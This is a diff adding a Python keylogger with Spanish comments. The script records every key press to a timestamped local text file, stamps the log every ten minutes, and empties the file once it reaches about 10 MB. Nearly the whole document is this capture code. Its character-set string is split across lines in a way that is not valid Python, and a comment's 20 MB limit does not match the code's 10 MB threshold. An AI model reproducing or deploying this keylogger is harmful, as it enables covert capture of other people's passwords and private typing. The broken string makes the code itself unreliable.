@@ -1,0 +1,96 @@
+import keyboard
+import os
+import time
+import signal
+import sys
+from datetime import datetime
+
+# Guardamos la fecha y hora de inicio de la captura
+inicio_captura = datetime.now().strftime("%d-%m-%Y_%H.%M.%S")
+
+# Nombre temporal del archivo durante la captura
+filename = f"keyboard_{inicio_captura}.txt"
+inicio = time.time()  # se inicia el temporizador para calcular los 10 minutos
+
+# Función para actualizar el nombre del archivo al finalizar la captura
+def actualizar_nombre_archivo():
+    fin_captura = datetime.now().strftime("%d-%m-%Y_%H.%M.%S")
+    nuevo_nombre = f"keyboard_{inicio_captura}_{fin_captura}.txt"
+    os.rename(filename, nuevo_nombre)
+
+# Manejador para interrupciones
+def signal_handler(sig, frame):
+    with open(filename, "a") as file_r:
+        file_r.write("\n")  # Agrega un salto de línea
+    actualizar_nombre_archivo()
+    print()  # Salto de línea en la línea de comandos
+    sys.exit(0)
+
+# Registrar la señal de interrupción
+signal.signal(signal.SIGINT, signal_handler)
+
+# Se calcula el tiempo de tal manera que si han pasado 10 min se logue el tiempo
+def file_modif_and_time():
+    global inicio
+    file_stats = os.stat(filename)
+    if file_stats.st_size > 0 and int(round(time.time() - inicio, 1)) >= 600:
+        inicio = time.time()
+        log_time()
+
+# Se calcula el tamaño del archivo para que no supere los 20 MB
+def size_f():
+    global inicio
+    file_stats = os.stat(filename)
+    if 10485760 <= file_stats.st_size <= 18922944:
+        with open(filename, "w") as f:
+            f.write('')
+        inicio = time.time()
+
+# Función para capturar las teclas
+def reg_keys():
+    try:
+        while True:
+            event = keyboard.read_event()
+            if event.event_type == keyboard.KEY_DOWN:
+                with open(filename, "a") as file_r:
+                    key = event.name
+                    # Definimos el conjunto de caracteres alfanuméricos y especiales
+                    if key in 'abcdefghijklmnopqrstuvwxyz
+                    ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                    0123456789
+                    -_=+[{]}\\|;:\'",<.>/?`~!@#$%^&*()_ ':
+                        if key == "space":
+                            file_r.write(" \n")
+                        else:
+                            file_r.write(f'{key}\n')  # Escribe caracteres alfanuméricos en una nueva línea
+                    else:
+                        # Convierte la primera letra de la tecla especial a mayúscula
+                        key_capitalized = key.capitalize()
+                        file_r.write(f' "{key_capitalized}" \n')  # Escribe teclas especiales en una nueva línea
+                size_f()
+                file_modif_and_time()
+    except KeyboardInterrupt:
+        with open(filename, "a") as file_r:
+            file_r.write("\n")  # Agrega un salto de línea en caso de interrupción
+        actualizar_nombre_archivo()
+        print()  # Salto de línea en la línea de comandos
+        sys.exit(0)
+
+# Se comprueba si el archivo está creado o no en el sistema
+def create_file():
+    if not os.path.exists(filename):
+        with open(filename, "w") as file:
+            pass
+
+# Registrar la hora de modificación del archivo
+def log_time():
+    with open(filename, "a") as file:
+        file.write(f'\nÚltima modificación: {time.ctime()}\n')
+
+# Se llama a las demás funciones
+def main():
+    create_file()
+    reg_keys()
+
+if __name__ == "__main__":
+    main()
